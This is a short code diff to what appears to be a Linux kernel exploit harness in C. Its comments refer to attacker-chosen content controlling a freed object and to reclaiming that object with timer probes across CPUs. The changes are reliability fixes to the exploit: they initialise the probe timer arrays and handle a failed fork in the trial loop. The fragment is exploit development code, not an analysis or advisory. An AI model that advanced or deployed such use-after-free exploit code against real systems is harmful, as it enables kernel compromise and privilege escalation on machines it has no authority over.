@@ -484,6 +484,9 @@ static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 	 * clean userspace oracle for attacker-chosen content driving the
 	 * freed object, and the fire path dequeues the ghost cleanly.
 	 */
+	for (int cpu = 0; cpu < 4; cpu++)
+		for (int i = 0; i < RECLAIM_PROBES; i++)
+			probe[cpu][i] = (timer_t)-1;
 	for (int i = 0; i < CPU2_PROBES; i++)
 		deep[i] = (timer_t)-1;
 	sigemptyset(&set44);
@@ -745,6 +748,10 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 
 	pid_t pid = fork();
 
+	if (pid < 0) {
+		emit("FORK_FAIL iter=%ld errno=%d\n", iter, errno);
+		return -1;
+	}
 	if (pid == 0) {
 		dup2(g_trig_pipe[0], 4);
 		close(g_trig_pipe[0]);
